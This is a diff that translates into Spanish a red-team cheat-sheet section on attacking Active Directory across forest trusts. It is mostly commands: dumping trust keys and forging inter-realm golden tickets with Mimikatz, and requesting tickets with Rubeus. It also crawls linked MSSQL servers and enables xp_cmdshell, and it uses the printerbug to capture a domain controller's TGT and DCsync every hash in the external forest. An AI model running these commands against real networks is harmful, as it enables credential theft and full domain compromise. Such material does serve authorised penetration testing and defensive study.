+## Ataques entre Bosques
 
-### Trust Tickets
+### Tickets de Confianza
 
-_WUT IS DIS ?: If we have Domain Admin rights on a Domain that has Bidirectional Trust relationship with an other forest we can get the Trust key and forge our own inter-realm TGT._
+_¿QUÉ ES DIS?: Si tenemos derechos de administrador de dominio en un dominio que tiene una relación de confianza bidireccional con un En otro bosque, podemos obtener la clave de confianza y forjar nuestro propio TGT interreino.
 
-:warning: The access we will have will be limited to what our DA account is configured to have on the other Forest!
+:warning: ¡El acceso que tendremos estará limitado a lo que nuestra cuenta DA tenga configurado en el otro bosque!
 
-- Using Mimikatz:
-
-  ```powershell
-  #Dump the trust key
-  Invoke-Mimikatz -Command '"lsadump::trust /patch"'
-  Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
-
-  #Forge an inter-realm TGT using the Golden Ticket attack
-  Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
-  <OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
-  <PathToSaveTheGoldenTicket>"'
-  ```
-
-  :exclamation: Tickets -> .kirbi format
-
-  Then Ask for a TGS to the external Forest for any service using the inter-realm TGT and access the resource!
-
-- Using Rubeus:
-
-  ```powershell
-  .\Rubeus.exe asktgs /ticket:<kirbi file> /service:"Service's SPN" /ptt
-  ```
-
-### Abuse MSSQL Servers
-
-- Enumerate MSSQL Instances: `Get-SQLInstanceDomain`
-- Check Accessibility as current user:
-
-  ```powershell
-  Get-SQLConnectionTestThreaded
-  Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
-  ```
-
-- Gather Information about the instance: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
-- Abusing SQL Database Links: \
-  _WUT IS DIS?: A database link allows a SQL Server to access other resources like other SQL Server. If we have two linked SQL Servers we can execute stored procedures in them. Database links also works across Forest Trust!_
-
-Check for existing Database Links:
+Usando Mimikatz:
 
 ```powershell
-#Check for existing Database Links:
+#Volcar la clave de confianza
+Invoke-Mimikatz -Command '"lsadump::trust /patch"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+
+#Forjar un TGT entre reinos usando el ataque Golden Ticket
+Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<OurDomain> /sid:
+<OurDomainSID> /rc4:<TrustKey> /service:krbtgt /target:<TheTargetDomain> /ticket:
+<PathToSaveTheGoldenTicket>"'
+```
+
+:exclamation: Tickets -> formato .kirbi
+
+Luego, solicita un TGS al bosque externo para cualquier servicio que use el TGT entre reinos y accede al recurso.
+
+Usando Rubeus:
+
+```powershell
+.\Rubeus.exe asktgs /ticket:<kirbifile> /service:"SPN del servicio" /ptt
+```
+
+### Abuso de servidores MSSQL
+
+- Enumerar instancias MSSQL: `Get-SQLInstanceDomain`
+- Comprobar accesibilidad como usuario actual:
+
+```powershell
+Get-SQLConnectionTestThreaded
+Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose
+```
+
+- Recopilar información sobre la instancia: `Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose`
+- Abuso de enlaces de bases de datos SQL: \
+_¿QUÉ ES ESTO?: Un enlace de base de datos permite que un servidor SQL acceda a otros recursos como otros servidores SQL. Si tenemos dos servidores SQL enlazados, podemos ejecutar procedimientos almacenados en ellos. Los enlaces de bases de datos también funcionan en toda la confianza de bosques.
+
+Comprobar enlaces de bases de datos existentes:
+
+```powershell
+#Comprobar enlaces de bases de datos existentes:
 #PowerUpSQL:
 Get-SQLServerLink -Instance <SPN> -Verbose
 
-#MSSQL Query:
+#Consulta MSSQL:
 select * from master..sysservers
 ```
 
-Then we can use queries to enumerate other links from the linked Database:
+Luego, podemos usar consultas para enumerar otros enlaces de la base de datos vinculada:
 
 ```powershell
-#Manualy:
+#Manualmente:
 select * from openquery("LinkedDatabase", 'select * from master..sysservers')
 
-#PowerUpSQL (Will Enum every link across Forests and Child Domain of the Forests):
+#PowerUpSQL (Enumerará todos los enlaces en los bosques y sus dominios secundarios):
 Get-SQLServerLinkCrawl -Instance <SPN> -Verbose
 
-# Enable RPC Out (Required to Execute XP_CMDSHELL)
-EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true';
-EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
+# Habilitar salida RPC (necesario para ejecutar XP_CMDSHELL)
+EXEC sp_serveroption 'sqllinked-hostname', 'rpc', 'true'; EXEC sp_serveroption 'sqllinked-hostname', 'rpc out', 'true';
 select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc'',''true'';');
 select * from openquery("SQL03", 'EXEC sp_serveroption ''SQL03'',''rpc out'',''true'';');
 
-#Then we can execute command on the machine's were the SQL Service runs using xp_cmdshell
-#Or if it is disabled enable it:
+#Luego podemos ejecutar el comando en la máquina donde se ejecuta el servicio SQL usando xp_cmdshell
+#O, si está deshabilitado, habilítalo:
 EXECUTE('sp_configure "xp_cmdshell",1;reconfigure;') AT "SPN"
 ```
 
-Query execution:
+Ejecución de la consulta:
 
 ```powershell
 Get-SQLServerLinkCrawl -Instace <SPN> -Query "exec master..xp_cmdshell 'whoami'"
 ```
 
-### Breaking Forest Trusts
+### Rompiendo las confianzas del bosque
 
-_WUT IS DIS?: \
+_¿QUÉ ES DIS?: \
 TL;DR \
-If we have a bidirectional trust with an external forest and we manage to compromise a machine on the local forest that has enabled unconstrained delegation (DCs have this by default), we can use the printerbug to force the DC of the external forest's root domain to authenticate to us. Then we can capture it's TGT, inject it into memory and DCsync to dump it's hashes, giving ous complete access over the whole forest._
+Si tenemos una confianza bidireccional con un bosque externo y logramos comprometer una máquina en el bosque local que tiene habilitada la delegación sin restricciones (los controladores de dominio la tienen por defecto), podemos usar el comando printerbug para forzar al controlador de dominio del dominio raíz del bosque externo a autenticarse con nosotros. Luego, podemos capturar su TGT, inyectarlo en memoria y usar DCsync para volcar sus hashes, lo que nos da acceso completo a todo el bosque.
 
-Tools we are going to use:
+Herramientas que usaremos:
 
 - [Rubeus](https://github.com/GhostPack/Rubeus)
 - [SpoolSample](https://github.com/leechristensen/SpoolSample)
 - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
 
-Exploitation example:
+Ejemplo de explotación:
 
 ```powershell
-#Start monitoring for TGTs with rubeus:
+#Iniciar la monitorización de TGT con Rubeus:
 Rubeus.exe monitor /interval:5 /filteruser:target-dc
 
-#Execute the printerbug to trigger the force authentication of the target DC to our machine
+#Ejecutar el `printerbug` para activar la autenticación forzada del controlador de dominio de destino en nuestra máquina
 SpoolSample.exe target-dc.external.forest.local dc.compromised.domain.local
 
-#Get the base64 captured TGT from Rubeus and inject it into memory:
+#Obtener el TGT base64 capturado de Rubeus e inyectarlo en Memoria:
 Rubeus.exe ptt /ticket:<Base64ValueofCapturedTicket>
 
-#Dump the hashes of the target domain using mimikatz:
+#Volcar los hashes del dominio de destino usando mimikatz:
 lsadump::dcsync /domain:external.forest.local /all
 ```
 
-Detailed Articles:
+Artículos detallados:
 
-- [Not A Security Boundary: Breaking Forest Trusts](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)
-- [Hunting in Active Directory: Unconstrained Delegation & Forests Trusts](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
+- [No es un límite de seguridad: Rompiendo las confianzas de bosque](https://blog.harmj0y.net/redteaming/not-a-security-boundary-breaking-forest-trusts/)
+- [Búsqueda en Active Directory: Delegación sin restricciones y confianzas de bosque](https://posts.specterops.io/hunting-in-active-directory-unconstrained-delegation-forests-trusts-71f2b33688e1)
